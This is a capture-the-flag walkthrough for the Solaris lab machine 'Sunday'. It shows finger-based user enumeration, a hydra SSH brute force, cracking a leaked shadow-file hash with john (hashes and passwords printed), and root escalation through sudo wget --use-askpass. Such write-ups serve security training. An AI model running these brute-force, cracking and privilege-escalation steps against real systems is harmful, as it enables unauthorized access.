
### Initial access
Nmap scan
```

PORT      STATE SERVICE REASON         VERSION
79/tcp    open  finger? syn-ack ttl 59
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
515/tcp   open  printer syn-ack ttl 59
6787/tcp  open  http    syn-ack ttl 59 Apache httpd
|_http-title: 400 Bad Request
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
22022/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.99%I=7%D=9/5%Time=6A9CD6D4%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:00
Completed NSE at 23:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:00
Completed NSE at 23:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:00
Completed NSE at 23:00, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.68 seconds
           Raw packets sent: 5 (220B) | Rcvd: 5 (220B)

```

Access web page first on port `6787`
![[Assets/Pasted image 20260906101013.png]]

Use metasploit to enum user

```bash
┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ msfconsole -q
use auxiliary/scanner/finger/finger_users
set RHOSTS 10.129.40.139
set USERS_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
msf > use auxiliary/scanner/finger/finger_users
msf auxiliary(scanner/finger/finger_users) > set RHOSTS 10.129.40.139
RHOSTS => 10.129.40.139
msf auxiliary(scanner/finger/finger_users) > set USERS_FILE /usr/share/wordlists/metasploit/unix_users.txt
USERS_FILE => /usr/share/wordlists/metasploit/unix_users.txt
msf auxiliary(scanner/finger/finger_users) > run
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: noaccess
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: nobody4
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: nobody
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: ikeuser
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: lp
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: adm
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: dladm
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: netadm
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: dhcpserv
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: netcfg
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: bin
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: smmsp
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: root
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: sammy
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: sunny
[+] 10.129.40.139:79      - 10.129.40.139:79 - Found user: sys
[+] 10.129.40.139:79      - 10.129.40.139:79 Users found: adm, bin, dhcpserv, dladm, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, root, sammy, smmsp, sunny, sys
[*] 10.129.40.139:79      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed



┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ finger root@10.129.40.139                                                           
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ finger sunny@10.129.40.139
Login       Name               TTY         Idle    When    Where
sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ finger sammy@10.129.40.139
Login       Name               TTY         Idle    When    Where
sammy           ???            ssh          <May  6, 2025> 10.10.14.68    

```

Burte fore on user sunny and sammy
```
┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ hydra -l sunny -P /usr/share/wordlists/rockyou.txt  ssh://10.129.40.139:22022
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-06 00:18:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking ssh://10.129.40.139:22022/
[STATUS] 1548.00 tries/min, 1548 tries in 00:01h, 14342857 to do in 154:26h, 13 active
[22022][ssh] host: 10.129.40.139   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-06 00:20:18

┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ ssh sunny@10.129.40.139 -p 22022
(sunny@10.129.40.139) Password: 
Last login: Sun Sep  6 04:19:40 2026 from 10.10.16.212
Oracle Solaris 11.4.42.111.0                  Assembled December 2021
sunny@sunday:~$ ls
local.cshrc    local.login    local.profile
sunny@sunday:~$ 


```

### Lateral Movement

We read bash history and see shadow back up crack it to get sammy password

```

sunny@sunday:~$ cat .bash_history
su -
su -
cat /etc/resolv.conf 
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf 
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll
sunny@sunday:~$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::


┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)     
1g 0:00:00:04 DONE (2026-09-06 00:37) 0.2123g/s 43481p/s 43481c/s 43481C/s pigglett..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Sunday]
└─$ cat hash             
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB


sammy@sunday:~$ sudo -l
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
                                                                
```
### Priv escalation
Usig gfto bin
```
sammy@sunday:/home/sammy$ echo -e '#!/bin/sh\n/bin/sh 1>&0' >/tmp/shell
sammy@sunday:/home/sammy$ chmod +x /tmp/shell
sammy@sunday:/home/sammy$ sudo wget --use-askpass=/tmp/shell  0
root@sunday:/home/sammy# id
uid=0(root) gid=0(root)

```
